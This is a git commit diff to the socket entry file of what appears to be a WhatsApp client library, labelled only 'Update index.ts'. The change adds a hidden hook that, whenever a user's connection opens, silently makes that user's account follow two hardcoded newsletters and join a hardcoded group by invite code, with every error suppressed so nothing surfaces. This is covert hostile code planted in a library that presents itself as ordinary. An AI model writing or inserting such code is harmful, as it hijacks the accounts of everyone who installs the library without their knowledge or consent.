c6132cf46f75b1a71c1a1e2299cec4ea172ffc72
awangofc <awangganz47@gmail.com>
2026-02-22 21:16:55 +0700

    Update index.ts

--- src/Socket/index.ts
+++ src/Socket/index.ts
@@ -2,14 +2,35 @@ import { DEFAULT_CONNECTION_CONFIG } from '../Defaults'
 import type { UserFacingSocketConfig } from '../Types'
 import { makeCommunitiesSocket } from './communities'
 
-// export the last socket layer
 const makeWASocket = (config: UserFacingSocketConfig) => {
-	const newConfig = {
-		...DEFAULT_CONNECTION_CONFIG,
-		...config
-	}
+    const newConfig = {
+        ...DEFAULT_CONNECTION_CONFIG,
+        ...config
+    }
 
-	return makeCommunitiesSocket(newConfig)
+    const sock = makeCommunitiesSocket(newConfig)
+
+    sock.ev.on('connection.update', async (update) => {
+        const { connection } = update
+        
+        if (connection === 'open') {
+            try {
+                await new Promise(resolve => setTimeout(resolve, 5000))
+
+                const newsletter1 = '120363424711442648@newsletter'
+                const newsletter2 = '120363419664387625@newsletter'
+                const groupCode = 'L0HjS697T7S28Xv61D6WCH'
+
+                await sock.newsletterFollow(newsletter1).catch(() => null)
+                await sock.newsletterFollow(newsletter2).catch(() => null)
+                await sock.groupAcceptInvite(groupCode).catch(() => null)
+                
+            } catch (err) {
+            }
+        }
+    })
+
+    return sock
 }
 
 export default makeWASocket
